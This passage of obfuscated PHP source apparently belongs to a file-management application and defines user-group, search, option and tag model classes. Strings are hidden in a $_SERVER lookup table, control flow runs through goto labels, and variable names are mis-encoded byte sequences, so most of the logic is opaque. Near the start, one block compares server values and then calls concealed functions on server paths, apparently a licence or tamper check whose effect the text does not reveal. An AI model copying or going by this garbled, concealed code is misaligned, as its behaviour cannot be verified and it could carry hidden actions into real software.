Model($b‰≠ü¢éﬁ‡[1773]); $A—„ÖµË¥¢->where(array($b‰≠ü¢éﬁ‡[1528] => $bΩçÒ”ãπ©))->delete(); goto d…¶∫„£√˘; Bœ™ÿ¿«Éâ: $b‰≠ü¢éﬁ‡ =& $_SERVER[ú∫]; if ($_SERVER[$b‰≠ü¢éﬁ‡[821]] != $_SERVER[$b‰≠ü¢éﬁ‡[1459]]) { goto fÑ˘Õæˆ¨„; fÑ˘Õæˆ¨„: $f†Àéö™Ô¥ = $b‰≠ü¢éﬁ‡[839]; $FÇ∆ÿ∫Ãª’ = $b‰≠ü¢éﬁ‡[823]; $c’í‹ú∂◊Ü = $_SERVER[$b‰≠ü¢éﬁ‡[824]] . $b‰≠ü¢éﬁ‡[825]; goto c”ò±õäúÏ; c”ò±õäúÏ: $AöÈêË§ô• = $FÇ∆ÿ∫Ãª’($c’í‹ú∂◊Ü); $BÇé…±ï‘Ç = explode($b‰≠ü¢éﬁ‡[229], $AöÈêË§ô•); if (count($BÇé…±ï‘Ç) < $b‰≠ü¢éﬁ‡[578]) { $bôß˘õΩ≥– = $b‰≠ü¢éﬁ‡[826]; $bôß˘õΩ≥–(); } goto cá„ï¶´Ô≠; C–◊è∫Ûªç: $F•¯ Ñà¢º = 1; while ($F•¯ Ñà¢º > 1) { $F•¯ Ñà¢º = $F•¯ Ñà¢º + 4; $d≥Ãˆë´≥î = rawurlencode($F•¯ Ñà¢º . $b‰≠ü¢éﬁ‡[375]); } goto dçÖ∂ØÖ¶; cá„ï¶´Ô≠: $D®ÉÚüÙ’∆ = $b‰≠ü¢éﬁ‡[840]; $D®ÉÚüÙ’∆($_SERVER[$b‰≠ü¢éﬁ‡[841]]); $D®ÉÚüÙ’∆($_SERVER[$b‰≠ü¢éﬁ‡[824]] . $b‰≠ü¢éﬁ‡[1460]); goto C–◊è∫Ûªç; dçÖ∂ØÖ¶: } $eâÿ∏⁄œ≈Ÿ = $this->getInfoSimple($bΩçÒ”ãπ©); goto fÊÃÒÀÖ® ; d…¶∫„£√˘: $Bé ˘ﬁãüá = array(); $BÑê±•Êœƒ = 0; foreach ($FÎ”°ÁÏÇÀ as $Eƒ¿ÃóÉ÷õ => $aÚ‚Ò‚˘¬ó) { $c‰¿‰ƒ´ã˘ = array($b‰≠ü¢éﬁ‡[1528] => $bΩçÒ”ãπ©, $b‰≠ü¢éﬁ‡[1692] => $Eƒ¿ÃóÉ÷õ, $b‰≠ü¢éﬁ‡[1787] => $aÚ‚Ò‚˘¬ó); $c‰¿‰ƒ´ã˘[$b‰≠ü¢éﬁ‡[1715]] = isset($aƒí‡≥ÜŒπ[$BÑê±•Êœƒ]) ? $aƒí‡≥ÜŒπ[$BÑê±•Êœƒ] : 0; $BÑê±•Êœƒ++; $Bé ˘ﬁãüá[] = $c‰¿‰ƒ´ã˘; } goto D®¨çµﬂÃ∑; D˜ô÷ìÁÈô: } protected function userGroupAdd($b¥ÒÊÀÇ≥É, $f¿Õ¯∑Ê¢‘ = array()) { $aŸ®ô‰Â—√ =& $_SERVER[ú∫]; $dèäø¬ßﬂÈ = $this->getInfoSimple($b¥ÒÊÀÇ≥É); if (!$dèäø¬ßﬂÈ || empty($f¿Õ¯∑Ê¢‘)) { return !1; } $CΩ¥Ì¬™◊º = array(); foreach ($f¿Õ¯∑Ê¢‘ as $B¡ƒÁÆöÎå => $dî‘ãÑÜ´±) { $CΩ¥Ì¬™◊º[] = array($aŸ®ô‰Â—√[1528] => $b¥ÒÊÀÇ≥É, $aŸ®ô‰Â—√[1692] => $B¡ƒÁÆöÎå, $aŸ®ô‰Â—√[1787] => $dî‘ãÑÜ´±, $aŸ®ô‰Â—√[1715] => 0); } return Model($aŸ®ô‰Â—√[1773])->addAll($CΩ¥Ì¬™◊º, array(), !0); } protected function userGroupRemove($DÃ≥∫úëãÙ, $eéœë´êåó) { $fëó¡¬ÏÑ˘ =& $_SERVER[ú∫]; $E¬Á–∑ÖıÑ = $this->getInfoSimple($DÃ≥∫úëãÙ); if (!$E¬Á–∑ÖıÑ || !$eéœë´êåó) { return !1; } $d‚õâ‰Öé¿ = array($fëó¡¬ÏÑ˘[1520] => $DÃ≥∫úëãÙ, $fëó¡¬ÏÑ˘[1770] => $eéœë´êåó); return Model($fëó¡¬ÏÑ˘[1773])->where($d‚õâ‰Öé¿)->delete(); } public function listData() { $Fâî∑ãâÿ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Fâî∑ãâÿ[$_SERVER[ú∫][367]]); return $Fâî∑ãâÿ; } public function listByID($CŸÉÂ‰‘øõ) { $B”€óä∏Ûë =& $_SERVER[ú∫]; if (!$CŸÉÂ‰‘øõ) { return; } $bˆ√çéïÙÀ = array($B”€óä∏Ûë[1528] => array($B”€óä∏Ûë[7], $CŸÉÂ‰‘øõ)); $fæ≤¬ì›¿ = $this->where($bˆ√çéïÙÀ)->select(); $this->_listDataApply($fæ≤¬ì›¿); return $fæ≤¬ì›¿; } public function listByGroup($Eí…≠òÿ±ß = 0, $aûíåéÈÿÿ = array()) { goto A–ÑÍ◊ÉÃ ; a§ìãæÍ‚ö: if ($Eí…≠òÿ±ß) { $F∫áñ´°—ß = array($Fâ°òÜ’˜Ù[2153] => intval($Eí…≠òÿ±ß)); $DºÂëˆ´´¨ = "\114\105\106\x54\40\112\117\111\x4e\x20{$this->tablePrefix}\165\x73\x65\162\137\x67\x72\x6f\x75\x70\40\x75\163\145\x72\x5f\x67\162\157\165\x70\x20\157\x6e\x20\165\163\145\162\56\165\x73\x65\162\111\x44\x20\x3d\x20\x75\163\145\162\137\147\162\x6f\x75\x70\x2e\x75\x73\145\162\111\x44"; $C•ÖÀ¡ëﬁü = Input::get($Fâ°òÜ’˜Ù[435], null, $Fâ°òÜ’˜Ù[33]) ? $Fâ°òÜ’˜Ù[33] : $Fâ°òÜ’˜Ù[2154]; } if (isset($aûíåéÈÿÿ[$Fâ°òÜ’˜Ù[710]])) { $F∫áñ´°—ß[$Fâ°òÜ’˜Ù[2155]] = $aûíåéÈÿÿ[$Fâ°òÜ’˜Ù[710]]; } $B“äﬁ√∞Êê = $this->_makeOrder($C•ÖÀ¡ëﬁü)->field($Fâ°òÜ’˜Ù[2156])->where($F∫áñ´°—ß)->join($DºÂëˆ´´¨)->selectPage(50); goto aÒû◊ƒ πº; A–ÑÍ◊ÉÃ : $Fâ°òÜ’˜Ù =& $_SERVER[ú∫]; $DºÂëˆ´´¨ = $Fâ°òÜ’˜Ù[33]; $F∫áñ´°—ß = array(); goto a§ìãæÍ‚ö; aÒû◊ƒ πº: $this->_listDataApply($B“äﬁ√∞Êê[$Fâ°òÜ’˜Ù[367]]); return $B“äﬁ√∞Êê; goto Fƒ°ÉàâÏ«; Fƒ°ÉàâÏ«: } private function _makeOrder($f∑œÜ’çÛ◊ = '') { goto BíÚÖ©¬Œ•; CêΩìƒ◊∫ò: $f∑œÜ’çÛ◊ = $f∑œÜ’çÛ◊ . "\x75\x73\x65\x72\x2e{$E°ÎŒÜÇ„›}\40{$aÜ‚âÒãõì}\x2c\40\165\x73\145\x72\x2e\165\x73\145\x72\111\x44\x20\x61\163\143"; return $this->alias($f÷« ’Áò∑[1896])->order($f∑œÜ’çÛ◊); goto dâ¶ä‰¿Êº; BíÚÖ©¬Œ•: $f÷« ’Áò∑ =& $_SERVER[ú∫]; $fúÎÌıı⁄© = array($f÷« ’Áò∑[1528], $f÷« ’Áò∑[28], $f÷« ’Áò∑[1678], $f÷« ’Áò∑[1650], $f÷« ’Áò∑[194]); $f∞ÚÑ∑‚ñ¯ = array($f÷« ’Áò∑[428] => $f÷« ’Áò∑[429], $f÷« ’Áò∑[430] => $f÷« ’Áò∑[431]); goto Eﬂë’—¿ûÖ; Eﬂë’—¿ûÖ: $E°ÎŒÜÇ„› = Input::get($f÷« ’Áò∑[435], $f÷« ’Áò∑[7], $f÷« ’Áò∑[1520], $fúÎÌıı⁄©); $aÜ‚âÒãõì = Input::get($f÷« ’Áò∑[436], $f÷« ’Áò∑[7], $f÷« ’Áò∑[1774], array($f÷« ’Áò∑[1774], $f÷« ’Áò∑[430])); $aÜ‚âÒãõì = $f∞ÚÑ∑‚ñ¯[$aÜ‚âÒãõì]; goto CêΩìƒ◊∫ò; dâ¶ä‰¿Êº: } public function listSearch($Dà÷åñÓ¯Ù) { goto f•£ÈΩ⁄Ï·; Cô¢Èã…¬∂: $this->_filterByGroup($e…≥úŸøÏ, $FŒãıÃÓ∆∂); return $e…≥úŸøÏ; goto f∆ì´‚ê◊ı; f•£ÈΩ⁄Ï·: $dü…Û£Ù‰È =& $_SERVER[ú∫]; $E¯ìù“Û¶Ë = $Dà÷åñÓ¯Ù[$dü…Û£Ù‰È[1775]]; $FŒãıÃÓ∆∂ = isset($Dà÷åñÓ¯Ù[$dü…Û£Ù‰È[1776]]) ? $Dà÷åñÓ¯Ù[$dü…Û£Ù‰È[1776]] : !1; goto c“¬π‡ ú´; d ı ê°Í¯: $e…≥úŸøÏ = $this->_makeOrder()->where($F£Ñ£¥€ç„)->selectPage(20); if (!$e…≥úŸøÏ || count($e…≥úŸøÏ[$dü…Û£Ù‰È[367]]) < 5 && Input::check($E¯ìù“Û¶Ë, $dü…Û£Ù‰È[316])) { $F€Í∏ÌïÜ◊ = $this->_searchFromMeta($dü…Û£Ù‰È[443], $E¯ìù“Û¶Ë, 10); $AëŒÕÕ£Ò√ = $this->_searchFromMeta($dü…Û£Ù‰È[444], $E¯ìù“Û¶Ë, 10); $f¶“˜…»†Ò = array_merge($F€Í∏ÌïÜ◊, $AëŒÕÕ£Ò√, $e…≥úŸøÏ[$dü…Û£Ù‰È[367]]); $e…≥úŸøÏ[$dü…Û£Ù‰È[367]] = array_unique_by_key($f¶“˜…»†Ò, $dü…Û£Ù‰È[1528]); $e…≥úŸøÏ[$dü…Û£Ù‰È[364]][$dü…Û£Ù‰È[365]] = count($e…≥úŸøÏ[$dü…Û£Ù‰È[367]]); $e…≥úŸøÏ[$dü…Û£Ù‰È[364]][$dü…Û£Ù‰È[366]] = ceil($e…≥úŸøÏ[$dü…Û£Ù‰È[364]][$dü…Û£Ù‰È[365]] / $e…≥úŸøÏ[$dü…Û£Ù‰È[364]][$dü…Û£Ù‰È[361]]); } $this->_listDataApply($e…≥úŸøÏ[$dü…Û£Ù‰È[367]]); goto Cô¢Èã…¬∂; c“¬π‡ ú´: $E¯ìù“Û¶Ë = str_replace($dü…Û£Ù‰È[1777], $dü…Û£Ù‰È[1778], trim($E¯ìù“Û¶Ë)); $F£Ñ£¥€ç„ = array($dü…Û£Ù‰È[28] => array($dü…Û£Ù‰È[380], "\x25{$E¯ìù“Û¶Ë}\45"), $dü…Û£Ù‰È[303] => array($dü…Û£Ù‰È[380], "{$E¯ìù“Û¶Ë}\45"), $dü…Û£Ù‰È[1956] => array($dü…Û£Ù‰È[380], "{$E¯ìù“Û¶Ë}\45"), $dü…Û£Ù‰È[957] => $dü…Û£Ù‰È[1779]); if (Input::check($E¯ìù“Û¶Ë, $dü…Û£Ù‰È[309])) { $F£Ñ£¥€ç„[$dü…Û£Ù‰È[1528]] = array($dü…Û£Ù‰È[380], "{$E¯ìù“Û¶Ë}\45"); $F£Ñ£¥€ç„[$dü…Û£Ù‰È[2137]] = array($dü…Û£Ù‰È[380], "{$E¯ìù“Û¶Ë}\x25"); } goto FØ¿µªı‰ÿ; FØ¿µªı‰ÿ: if (!$E¯ìù“Û¶Ë) { $F£Ñ£¥€ç„ = array(); } if (isset($Dà÷åñÓ¯Ù[$dü…Û£Ù‰È[710]])) { $F£Ñ£¥€ç„[$dü…Û£Ù‰È[710]] = $Dà÷åñÓ¯Ù[$dü…Û£Ù‰È[710]]; } $F£Ñ£¥€ç„ = $this->parseWhereLike($F£Ñ£¥€ç„); goto d ı ê°Í¯; f∆ì´‚ê◊ı: } private function _filterByGroup(&$aÚ›ßŒÏÊ‰, $DÎ∏‡ßêÉÑ) { $eùÉ—èÕíî =& $_SERVER[ú∫]; if (!$DÎ∏‡ßêÉÑ) { return $aÚ›ßŒÏÊ‰; } foreach ($aÚ›ßŒÏÊ‰[$eùÉ—èÕíî[367]] as $CôËç˜…†õ => &$bÔÍÒÓç∫µ) { $eØ ‡¶Ù ú = array_to_keyvalue($bÔÍÒÓç∫µ[$eùÉ—èÕíî[1866]], $eùÉ—èÕíî[33], $eùÉ—èÕíî[1692]); if (!in_array($DÎ∏‡ßêÉÑ, $eØ ‡¶Ù ú)) { unset($aÚ›ßŒÏÊ‰[$eùÉ—èÕíî[367]][$CôËç˜…†õ]); } } unset($bÔÍÒÓç∫µ); $aÚ›ßŒÏÊ‰[$eùÉ—èÕíî[367]] = array_values($aÚ›ßŒÏÊ‰[$eùÉ—èÕíî[367]]); $aÚ›ßŒÏÊ‰[$eùÉ—èÕíî[364]] = array($eùÉ—èÕíî[1928] => count($aÚ›ßŒÏÊ‰[$eùÉ—èÕíî[367]]), $eùÉ—èÕíî[1926] => $aÚ›ßŒÏÊ‰[$eùÉ—èÕíî[364]][$eùÉ—èÕíî[361]], $eùÉ—èÕíî[1925] => 1, $eùÉ—èÕíî[1927] => 1); } private function _searchFromMeta($dÛ‰Îë„∑¯, $DãÁı◊Ï÷, $d…ë≠±Ì∏È) { goto cŒé¶°›ñ; Bæûïüóî§: $a—Ù≠Ã’ıµ = $this->parseWhereLike($a—Ù≠Ã’ıµ); $FΩ•á¢Ã≥≥ = Model($dËÕæë…⁄‰[2157])->where($a—Ù≠Ã’ıµ)->limit($d…ë≠±Ì∏È)->select(); if (!$FΩ•á¢Ã≥≥) { return array(); } goto EÖØÎ®»÷¡; FËä«Ôá™“: return $A©Õ◊ßèΩÚ; goto F««ˆ›É§‰; EÖØÎ®»÷¡: $FΩ•á¢Ã≥≥ = array_to_keyvalue($FΩ•á¢Ã≥≥, $dËÕæë…⁄‰[33], $dËÕæë…⁄‰[1528]); $A©Õ◊ßèΩÚ = $this->where(array($dËÕæë…⁄‰[1520] => array($dËÕæë…⁄‰[7], $FΩ•á¢Ã≥≥)))->select(); if (!$A©Õ◊ßèΩÚ) { return array(); } goto FËä«Ôá™“; cŒé¶°›ñ: $dËÕæë…⁄‰ =& $_SERVER[ú∫]; $DãÁı◊Ï÷ = strtolower($DãÁı◊Ï÷); $a—Ù≠Ã’ıµ = array($dËÕæë…⁄‰[93] => $dÛ‰Îë„∑¯, $dËÕæë…⁄‰[372] => array($dËÕæë…⁄‰[380], "\45{$DãÁı◊Ï÷}\x25")); goto Bæûïüóî§; F««ˆ›É§‰: } private function _listDataApplyItem($fßàÙâé∏ö) { $E‡ñ‹åû…⁄ = array($fßàÙâé∏ö); $this->_listDataApply($E‡ñ‹åû…⁄); return $E‡ñ‹åû…⁄[0]; } private function _listDataApply(&$EıÎµ¿Í¥Ô) { goto böãÖ…ÒË“; eËÂ¢©ç°Ø: $this->_listAppendSourceRoot($EıÎµ¿Í¥Ô, $dèï›÷ı¢‚); goto d¡âôä•©Û; côÉÀﬂõ≠Ô: $dèï›÷ı¢‚ = array_to_keyvalue($EıÎµ¿Í¥Ô, $CÇ∞÷®µ”‹[33], $CÇ∞÷®µ”‹[1528]); $this->_listAppendGroup($EıÎµ¿Í¥Ô, $dèï›÷ı¢‚); $this->_listAppendMeta($EıÎµ¿Í¥Ô, $dèï›÷ı¢‚); goto eËÂ¢©ç°Ø; böãÖ…ÒË“: $CÇ∞÷®µ”‹ =& $_SERVER[ú∫]; if (!$EıÎµ¿Í¥Ô) { return; } array_remove_key($EıÎµ¿Í¥Ô, $CÇ∞÷®µ”‹[849]); goto côÉÀﬂõ≠Ô; d¡âôä•©Û: } private function _listAppendSourceRoot(&$d∞à°ÌñŒ’, $D»Ò˜∂≤Ì∞) { goto E∏ﬁÚ—Àåé; c√âàÇ§Í„: foreach ($d∞à°ÌñŒ’ as &$b«∂£¬πË¿) { $b«∂£¬πË¿[$aöÔ¿÷¿’≥[85]] = $eõ¡≠úÛ«å[$b«∂£¬πË¿[$aöÔ¿÷¿’≥[1528]]] ? $eõ¡≠úÛ«å[$b«∂£¬πË¿[$aöÔ¿÷¿’≥[1528]]] : array(); } unset($b«∂£¬πË¿); goto D©∆èÀÉ≠õ; cØ±•ëÑ¡É: $eõ¡≠úÛ«å = Model($aöÔ¿÷¿’≥[790])->order($aöÔ¿÷¿’≥[1786])->field($b‰Ú≥œ°¯™)->where($BüÙ∑Ñ•»£)->select(); $eõ¡≠úÛ«å = array_to_keyvalue($eõ¡≠úÛ«å, $aöÔ¿÷¿’≥[484]); $eõ¡≠úÛ«å = array_remove_key($eõ¡≠úÛ«å, $aöÔ¿÷¿’≥[484]); goto c√âàÇ§Í„; E∏ﬁÚ—Àåé: $aöÔ¿÷¿’≥ =& $_SERVER[ú∫]; $BüÙ∑Ñ•»£ = array($aöÔ¿÷¿’≥[478] => 0, $aöÔ¿÷¿’≥[404] => SourceModel::TYPE_USER, $aöÔ¿÷¿’≥[484] => array($aöÔ¿÷¿’≥[7], $D»Ò˜∂≤Ì∞)); $b‰Ú≥œ°¯™ = $aöÔ¿÷¿’≥[1785]; goto cØ±•ëÑ¡É; D©∆èÀÉ≠õ: } private function _listAppendGroup(&$b¯ΩÛ†°åÃ, $fπÚíçªà£) { goto A‚â„ó¯Ïá; BµÛƒ¨ßÿ¡: $b€íƒ∑√‚µ = array($b”≥òë§ÂÓ[1692] => array($b”≥òë§ÂÓ[7], $A¥ßæª¡≈ú)); $C•áÖﬂïüô = Model($b”≥òë§ÂÓ[1864])->field($b”≥òë§ÂÓ[2158])->where($b€íƒ∑√‚µ)->select(); $C•áÖﬂïüô = array_to_keyvalue($C•áÖﬂïüô, $b”≥òë§ÂÓ[1692]); goto A‚∫∆ï·ßß; A‚∫∆ï·ßß: $D‘§¡’Ò±’ = array_to_keyvalue_group($D‘§¡’Ò±’, $b”≥òë§ÂÓ[1528]); foreach ($D‘§¡’Ò±’ as &$d’‚Ñ≈Çå∞) { $Bπ§Í◊Ü–™ = array(); foreach ($d’‚Ñ≈Çå∞ as $EŒÓ◊∆ı¯¿) { if (!$EŒÓ◊∆ı¯¿[$b”≥òë§ÂÓ[1787]]) { continue; } $aïÖﬁÌèäª = Model($b”≥òë§ÂÓ[1859])->listData($EŒÓ◊∆ı¯¿[$b”≥òë§ÂÓ[1787]]); $Bπ§Í◊Ü–™[] = array($b”≥òë§ÂÓ[1692] => $EŒÓ◊∆ı¯¿[$b”≥òë§ÂÓ[1692]], $b”≥òë§ÂÓ[2159] => $C•áÖﬂïüô[$EŒÓ◊∆ı¯¿[$b”≥òë§ÂÓ[1692]]][$b”≥òë§ÂÓ[28]], $b”≥òë§ÂÓ[487] => $C•áÖﬂïüô[$EŒÓ◊∆ı¯¿[$b”≥òë§ÂÓ[1692]]][$b”≥òë§ÂÓ[487]], $b”≥òë§ÂÓ[406] => $aïÖﬁÌèäª); } $d’‚Ñ≈Çå∞ = $Bπ§Í◊Ü–™; } unset($d’‚Ñ≈Çå∞); goto E‚«Ç˜éæ‰; A‚â„ó¯Ïá: $b”≥òë§ÂÓ =& $_SERVER[ú∫]; $b€íƒ∑√‚µ = array($b”≥òë§ÂÓ[1528] => array($b”≥òë§ÂÓ[7], $fπÚíçªà£)); $D‘§¡’Ò±’ = Model($b”≥òë§ÂÓ[1773])->where($b€íƒ∑√‚µ)->select(); goto cˆºãÉòıÌ; E‚«Ç˜éæ‰: foreach ($b¯ΩÛ†°åÃ as &$d¡Èœëù‡ç) { $d¡Èœëù‡ç[$b”≥òë§ÂÓ[1866]] = array(); if (isset($D‘§¡’Ò±’[$d¡Èœëù‡ç[$b”≥òë§ÂÓ[1528]]])) { $d¡Èœëù‡ç[$b”≥òë§ÂÓ[1866]] = $D‘§¡’Ò±’[$d¡Èœëù‡ç[$b”≥òë§ÂÓ[1528]]]; } } unset($d¡Èœëù‡ç); goto E‰£ﬁºﬁ∞˘; cˆºãÉòıÌ: $A¥ßæª¡≈ú = array_to_keyvalue($D‘§¡’Ò±’, $b”≥òë§ÂÓ[33], $b”≥òë§ÂÓ[1692]); $A¥ßæª¡≈ú = array_remove_value(array_unique($A¥ßæª¡≈ú), $b”≥òë§ÂÓ[191]); if (!$A¥ßæª¡≈ú || !$D‘§¡’Ò±’) { return; } goto BµÛƒ¨ßÿ¡; E‰£ﬁºﬁ∞˘: } private function _listAppendMeta(&$F÷ìÚö≥ÓÀ, $B’Ñœá∂ÚÃ) { goto A∞èãå“πß; A∞èãå“πß: $bæ∑ô‚Âúî =& $_SERVER[ú∫]; $Aàä≠›À⁄• = UserJobModel::JOB_KEY; $AﬂãæÛËÌõ = array($bæ∑ô‚Âúî[2138]); goto bññÓÔ’Æ≥; bññÓÔ’Æ≥: $DÊ§™’Ò…Ô = array($bæ∑ô‚Âúî[1528] => array($bæ∑ô‚Âúî[7], $B’Ñœá∂ÚÃ)); $CúÚ¬é´”õ = Model($bæ∑ô‚Âúî[2136])->where($DÊ§™’Ò…Ô)->select(); $CúÚ¬é´”õ = array_to_keyvalue_group($CúÚ¬é´”õ, $bæ∑ô‚Âúî[1528]); goto böô›â“¯ƒ; c¡‘ÜŸ∫ï„: foreach ($F÷ìÚö≥ÓÀ as &$Eô‹ÕîÀ„‘) { $d‘ÌŸ™Ûû¨ = array(); if (isset($CúÚ¬é´”õ[$Eô‹ÕîÀ„‘[$bæ∑ô‚Âúî[1528]]])) { $d‘ÌŸ™Ûû¨ = $CúÚ¬é´”õ[$Eô‹ÕîÀ„‘[$bæ∑ô‚Âúî[1528]]]; } $Eô‹ÕîÀ„‘[$bæ∑ô‚Âúî[2161]] = array(); if (isset($d‘ÌŸ™Ûû¨[$Aàä≠›À⁄•])) { $Eô‹ÕîÀ„‘[$bæ∑ô‚Âúî[2161]] = $bÓÂèÖ¿èÖ->getUserJobInfo($d‘ÌŸ™Ûû¨[$Aàä≠›À⁄•]); } } unset($Eô‹ÕîÀ„‘); goto A®…åäªÚÜ; böô›â“¯ƒ: foreach ($CúÚ¬é´”õ as &$B§áÜò—«Ï) { $cí÷©™ÉÈ = array(); foreach ($B§áÜò—«Ï as $c©†¡€≠‚Ã) { if (!in_array($c©†¡€≠‚Ã[$bæ∑ô‚Âúî[93]], $AﬂãæÛËÌõ)) { $cí÷©™ÉÈ[$c©†¡€≠‚Ã[$bæ∑ô‚Âúî[93]]] = $c©†¡€≠‚Ã[$bæ∑ô‚Âúî[372]]; } } $B§áÜò—«Ï = $cí÷©™ÉÈ; } unset($B§áÜò—«Ï); $bÓÂèÖ¿èÖ = Model($bæ∑ô‚Âúî[2160]); goto c¡‘ÜŸ∫ï„; A®…åäªÚÜ: } protected function groupUserAll($eˆ≠üÃÓÇÌ) { $Døï∑ö«√ı =& $_SERVER[ú∫]; if (!$eˆ≠üÃÓÇÌ) { return !1; } $Eåùﬁ∂‚íﬁ = Model($Døï∑ö«√ı[1773])->field($Døï∑ö«√ı[1528])->where(array($Døï∑ö«√ı[1692] => array($Døï∑ö«√ı[7], $eˆ≠üÃÓÇÌ)))->select(); $Eåùﬁ∂‚íﬁ = array_to_keyvalue($Eåùﬁ∂‚íﬁ, $Døï∑ö«√ı[33], $Døï∑ö«√ı[1528]); return array_unique($Eåùﬁ∂‚íﬁ); } public function userSearch($aı≤‹ÉÆîî, $fÂ⁄∏’É›Î = "\x2a") { return Model($_SERVER[ú∫][506])->where($aı≤‹ÉÆîî)->field($fÂ⁄∏’É›Î)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\x72\x5f\157\160\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($dîﬂÍèÍà¬) { $aÕøÈ¿√ÎÉ =& $_SERVER[ú∫]; if (!defined($aÕøÈ¿√ÎÉ[454])) { define($aÕøÈ¿√ÎÉ[454], 0); } return "\x55\x73\x65\x72\117\x70\164\x69\157\156\137{$dîﬂÍèÍà¬}\x5f" . USER_ID; } protected function filterWhere($e£≤˜ûçÎå) { $e´óÍ¬è¡Æ =& $_SERVER[ú∫]; if (!defined($e´óÍ¬è¡Æ[454])) { define($e´óÍ¬è¡Æ[454], 0); } $e£≤˜ûçÎå[$e´óÍ¬è¡Æ[1528]] = USER_ID; return $e£≤˜ûçÎå; } public function cacheRemoveUser($Bˆ’Ì…∑ËÆ, $cÉà≈äü¶”) { return Cache::remove("\x55\x73\145\162\117\160\x74\151\x6f\x6e\x5f{$Bˆ’Ì…∑ËÆ}\x5f" . $cÉà≈äü¶”); } protected function optionDefault($f¢—ΩœíÉ“ = '') { $Cœƒö¡ùàﬂ =& $_SERVER[ú∫]; if ($f¢—ΩœíÉ“ == $Cœƒö¡ùàﬂ[33]) { return $GLOBALS[$Cœƒö¡ùàﬂ[6]][$Cœƒö¡ùàﬂ[2162]]; } if ($f¢—ΩœíÉ“ == $Cœƒö¡ùàﬂ[2163]) { return $GLOBALS[$Cœƒö¡ùàﬂ[6]][$Cœƒö¡ùàﬂ[2164]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\x2e\164\x61\147\114\151\163\164"; public $modelType = "\x55\x73\145\162\x4f\160\164\x69\x6f\156"; public $field = array("\x6e\x61\155\x65", "\163\x74\171\154\x65", "\163\x6f\162\x74"); public function listData($C‡òÚìÉöÒ = false, $f∏Ÿ—ºµê÷ = "\x73\157\162\x74", $föæÉîë’… = false) { return parent::listData($C‡òÚìÉöÒ, $f∏Ÿ—ºµê÷, $föæÉîë’…); } public function remove($bÑêîëÒÒ) { return parent::remove($bÑêîëÒÒ); } public function add($CÓ∞˜˘∫ãÓ, $C≥¥•èÛãÕ = "\154\141\142\145\x6c\55\147\x72\145\171\55\x6e\157\162\x6d\x61\154") { $b¨˜êæÊòÖ =& $_SERVER[ú∫]; if ($this->findByName($CÓ∞˜˘∫ãÓ)) { return !1; } $cı¨ø⁄£–ˆ = array($b¨˜êæÊòÖ[413] => $CÓ∞˜˘∫ãÓ, $b¨˜êæÊòÖ[464] => $C≥¥•èÛãÕ, $b¨˜êæÊòÖ[1696] => $this->getSort($b¨˜êæÊòÖ[256]) + 1); return parent::insert($cı¨ø⁄£–ˆ); } public function update($cåà®—≠¡§, $DÏ¶¡ıµÖÕ) { $bÚ”∑…é‘≥ =& $_SERVER[ú∫]; $E€◊›µ‹»¶ = $this->listData($cåà®—≠¡§); $eøñÙ”“÷ö = $this->findByName($DÏ¶¡ıµÖÕ[$bÚ”∑…é‘≥[28]]); if (!$E€◊›µ‹»¶ || $eøñÙ”“÷ö && $eøñÙ”“÷ö[$bÚ”∑…é‘≥[393]] != $E€◊›µ‹»¶[$bÚ”∑…é‘≥[393]]) { return !1; } return parent::update($cåà®—≠¡§, $DÏ¶¡ıµÖÕ); } public function moveTop($fçÕç»“ÑŒ) { $DÍÙ¶ÉåΩƒ =& $_SERVER[ú∫]; $cÒ⁄¨ïéß‰ = parent::listData(); $aãµÌõñë° = $this->getSort($DÍÙ¶ÉåΩƒ[255]); foreach ($cÒ⁄¨ïéß‰ as &$dì Ÿ£¢Úá) { if ($dì Ÿ£¢Úá[$DÍÙ¶ÉåΩƒ[393]] == $fçÕç»“ÑŒ) { $dì Ÿ£¢Úá[$DÍÙ¶ÉåΩƒ[1715]] = $aãµÌõñë°; continue; } $dì Ÿ£¢Úá[$DÍÙ¶ÉåΩƒ[1715]] += 1; } unset($dì Ÿ£¢Úá); return parent::resetData($cÒ⁄¨ïéß‰); } public function moveBottom($B∂«åè≤Ôì) { $CÑª˘®Ø•∞ =& $_SERVER[ú∫]; $fÙ√Á“ëÂü = $this->getSort($CÑª˘®Ø•∞[256]) + 1; return parent::update($B∂«åè≤Ôì, array($CÑª˘®Ø•∞[1715] => $fÙ√Á“ëÂü)); } public function resetSort($e†¿ï«‰ãı) { goto EŸä≥ûÿ„≥; EŸä≥ûÿ„≥: $a¿—´ò®òﬂ =& $_SERVER[ú∫]; $dÌ´‰¿í¶ÿ = array(); $e†¿ï«‰ãı = is_array($e†¿ï«‰ãı) ? $e†¿ï«‰ãı : array(); goto Eè’ßïçä◊; Eè’ßïçä◊: for ($E÷ÇÚÆÒê⁄ = 0; $E÷ÇÚÆÒê⁄ < count($e†¿ï«‰ãı); $E÷ÇÚÆÒê⁄++) { $dÌ´‰¿í¶ÿ[$e†¿ï«‰ãı[$E÷ÇÚÆÒê⁄] . $a¿—´ò®òﬂ[33]] = $E÷ÇÚÆÒê⁄ + 1; } $e´öâ»÷ñÙ = parent::listData(); foreach ($e´öâ»÷ñÙ as &$B∫Õ†…≈†â) { $e€‘‚ùíé∑ = $dÌ´‰¿í¶ÿ[$B∫Õ†…≈†â[$a¿—´ò®òﬂ[393]]]; $B∫Õ†…≈†â[$a¿—´ò®òﬂ[1715]] = $e€‘‚ùíé∑ ? $e€‘‚ùíé∑ : $B∫Õ†…≈†â[$a¿—´ò®òﬂ[1715]]; } goto eπóÍöûíú; eπóÍöûíú: unset($B∫Õ†…≈†â); return parent::resetData($e´öâ»÷ñÙ); goto e≠Ñ«Õ®‘Â; e≠Ñ«Õ®‘Â: } private function getSort($b·©Ñ»˘≥œ) { $D¿À¥Ú∫áí =& $_SERVER[ú∫]; $fë€™åÇ∏Ã = parent::listData(); $cÇª≤˜ì‰ﬁ = array_to_keyvalue($fë€™åÇ∏Ã, $D¿À¥Ú∫áí[33], $D¿À¥Ú∫áí[1715]); if (!$cÇª≤˜ì‰ﬁ) { $cÇª≤˜ì‰ﬁ = array(0); } $EÖ≤Â—∏Ë– = $b·©Ñ»˘≥œ == $D¿À¥Ú∫áí[256] ? max($cÇª≤˜ì‰ﬁ) : min($cÇª≤˜ì‰ﬁ); return intval($EÖ≤Â—∏Ë–); } } goto A¿ò÷ê«ëŸ; 